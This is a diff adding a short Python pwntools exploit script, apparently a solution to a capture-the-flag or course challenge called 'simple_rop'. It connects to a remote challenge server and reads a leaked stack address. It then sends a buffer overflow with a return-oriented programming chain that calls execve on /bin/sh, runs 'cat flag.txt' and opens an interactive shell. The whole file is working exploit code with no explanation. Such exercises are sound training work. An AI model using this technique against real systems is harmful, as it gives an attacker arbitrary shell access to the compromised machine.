@@ -1,0 +1,32 @@
+#!/usr/bin/env python3
+from pwn import *
+
+# p = gdb.debug('./simple_rop', gdbscript='''
+#     b 23
+#     c
+# ''')
+
+HOST = '140.113.207.245'
+PORT = 30173
+p = remote(HOST, PORT)
+
+p.recvuntil(b"stack address ")
+base = p.recvline()
+base = int(base, 16)
+
+# 0x0000000000401324 : syscall
+# 0x00000000004104c2 : pop rsi ; ret            NULL
+# 0x0000000000427f2b : pop rax ; ret            0x3b
+# 0x0000000000413270 : pop rdx ; ret            NULL
+# 0x0000000000402188 : pop rdi ; pop rbp ; ret  /bin/sh
+
+data =  b'A'*24 + p64(0x00000000004104c2) + b'\x00'*8 + \
+        p64(0x0000000000427f2b) + p64(0x3b) + \
+        p64(0x0000000000413270) + b'\x00'*8 + \
+        p64(0x0000000000402188) + b"/bin/sh\x00" + b'\x00'*8 + \
+        p64(0x0000000000402188) + p64(base + 0x50) + b'\x00'*8 + \
+        p64(0x0000000000401324)
+
+p.sendline(data)
+p.sendline(b"cat flag.txt")
+p.interactive()
